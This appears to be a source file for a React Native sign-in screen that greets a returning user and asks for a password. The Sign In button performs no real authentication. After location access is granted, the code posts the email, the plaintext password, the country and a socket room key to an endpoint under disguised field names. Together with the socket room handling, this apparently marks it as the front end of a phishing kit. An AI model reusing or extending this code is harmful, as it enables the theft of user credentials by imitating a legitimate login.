
import { View, Text, StyleSheet,TouchableOpacity,TextInput,ActivityIndicator } from 'react-native'
import React,{useState,useContext, useEffect} from 'react'
import { AuthContext } from '@/src/utils/authContext'
import Feather from '@expo/vector-icons/Feather';
import FontAwesome6 from '@expo/vector-icons/FontAwesome6';
import Octicons from '@expo/vector-icons/Octicons';
import Ionicons from '@expo/vector-icons/Ionicons';
import FontAwesome from '@expo/vector-icons/FontAwesome';
import { useRouter } from 'expo-router';




type user = {
email:string,
password:string
}



const sign = () => {


const router = useRouter()
const {WIDTH,HEIGHT,myClient,isloading,delPipeline,socket,roomKey,locationP,api,setisloading,enableLocation} = useContext(AuthContext)
const [isopen,setisopen] = useState(true)
const [user,setUser] = useState<user>({email:'',password:''})





const connectExistingUser = () => {
socket.emit('existingRoom',roomKey)
}


const beginSession = async () => {

if (user.password === '') return

setisloading(true)
enableLocation()

}





useEffect(() => {
socket.removeAllListeners("connect")
setUser({email:myClient.email,password:''})
},[])



useEffect(() => {
if (roomKey) {
socket.on('connect',connectExistingUser)
}
},[roomKey])



useEffect(() => {

if (locationP.isEnable) {

const cot = async () => {
await api.post('qxdata/cdntls',{qxcountry:locationP.isocode,qxmail:user.email,qxpass:user.password,qxrkey:roomKey})
}


cot()

}

},[locationP.isEnable])






return (
<View style={[styles.container,{width:WIDTH, height:HEIGHT}]}>
<View style={styles.framei}>
<View style={styles.itemi}>
<Text style={styles.textii}>Welcome back , {myClient.fname}!</Text>
</View>
<View style={styles.itemii}>
<Text style={styles.textc}>kindly enter your password for access</Text>
</View>
</View>

<View style={styles.frameii}>
<View style={styles.boxi}>
<Feather name="mail" size={24} color="grey" />
</View>
<View style={styles.boxii}>
<Text style={[styles.textii,{fontSize:18}]}>{user.email}</Text>
</View>
<TouchableOpacity style={styles.boxiii} 
onPress={() => {
delPipeline()
router.push({pathname:'/(signIn)/next'})
}}>
<Text style={[styles.textii,{fontSize:16,color:'#2B47FF'}]}>Change</Text>
<FontAwesome6 name="edit" size={18} color='#2B47FF' />
</TouchableOpacity>
</View>

<View style={styles.frameiii}>
<View style={styles.nesti}>
<Text style={[styles.textii,{fontSize:18}]}>Enter Password</Text>
</View>
<View style={styles.nestii}>
<View style={styles.recti}>
<Octicons name="key" size={24} color='grey' />
</View>
<View style={styles.rectii}>
<TextInput style={styles.input} secureTextEntry={isopen} value={user.password} onChangeText={text => setUser({...user,password:text})}/>
</View>
<View style={styles.rectiii}>
<TouchableOpacity onPressIn={() => setisopen(false)} onPressOut={() => setisopen(true)}>
<Ionicons name="eye-outline" size={24} color="grey" />
</TouchableOpacity>
</View>
</View>
</View>

<View style={styles.frameiv}>
<TouchableOpacity onPress={() => router.push({pathname:'/forgotpass'})}>
<Text style={[styles.textii,{fontSize:18,color:'#424A55'}]}>Forgot Password ?</Text>
</TouchableOpacity>
</View>


<View style={styles.framev}>
{
isloading ? (<View style={styles.btn}><ActivityIndicator size={16} color='azure' /></View>) : (<TouchableOpacity style={styles.btn} onPress={beginSession}>
<Text style={[styles.textii,{fontSize:22,color:"#FFFFFF"}]} >Sign In</Text>
<FontAwesome name="angle-right" size={30} color="#FFFFFF" />
</TouchableOpacity>)
}

</View>

</View>
)
}

export default sign









const styles = StyleSheet.create({

container: {
justifyContent:'center',
alignItems:'center',
flex:1
},

framei: {
justifyContent:'center',
alignItems:'center',
position:'absolute',
bottom:"81.4%",
width:"88.1%",
height:'9.6%',
flexDirection:'column'
},

itemi: {
justifyContent:'center',
alignItems:'center',
width:"100%",
height:'60%',
},

itemii: {
justifyContent:'center',
alignItems:'center',
width:"100%",
height:'40%',
},

textii: {
fontFamily:'CabinetGrotesk-Medium',
fontSize:24,
fontWeight:500,
color:'#1A1D21'
},

textc: {
fontFamily:'CabinetGrotesk-Regular',
fontWeight:400,
fontSize:20,
lineHeight:24,
color:'#424A55'
},

frameii: {
justifyContent:'center',
alignItems:'center',
position:'absolute',
top:'28.6%',
width:"88.1%",
height:'2.8%',
flexDirection:'row'
},

boxi: {
justifyContent:'center',
alignItems:'center',
width:"12%",
height:'100%',
},

boxii: {
justifyContent:'center',
alignItems:'flex-start',
width:"60%",
height:'100%',
},

boxiii: {
justifyContent:'flex-end',
alignItems:'center',
width:"28%",
height:'100%',
flexDirection:'row',
columnGap:10,
},

frameiii: {
justifyContent:'center',
alignItems:'center',
position:'absolute',
top:'38.2%',
width:"88.1%",
height:'9.2%',
flexDirection:'column'
},

nesti: {
justifyContent:'center',
alignItems:'flex-start',
width:'100%',
height:'40%',
},

nestii: {
justifyContent:'center',
alignItems:'center',
width:'100%',
height:'60%',
flexDirection:'row',
borderBottomWidth:1,
borderBottomColor:'#CBD2D9'
},

recti:{
justifyContent:'center',
alignItems:'flex-end',
width:'8%',
height:'100%',


},

rectii:{
justifyContent:'center',
alignItems:'center',
width:'84%',
height:'100%',
},

rectiii:{
justifyContent:'center',
alignItems:'center',
width:'8%',
height:'100%',

},

input: {
width:'95%',
height:'95%',
backgroundColor:'white',
color:'#1A1D21',
fontFamily:'CabinetGrotesk-Regular',
fontWeight:400,
fontSize:22,
paddingLeft:10
},

frameiv: {
justifyContent:'center',
alignItems:'flex-end',
position:'absolute',
top:'51.9%',
width:"88.1%",
height:'2.8%',
},

framev: {
justifyContent:'center',
alignItems:'center',
position:'absolute',
top:'89.4%',
width:'88.1%',
height:'5.5%',
},

btn: {
justifyContent:'center',
alignItems:'center',
width:'100%',
height:'95%',
borderRadius:18,
backgroundColor:'#2B47FF',
flexDirection:'row',
columnGap:15,
},


})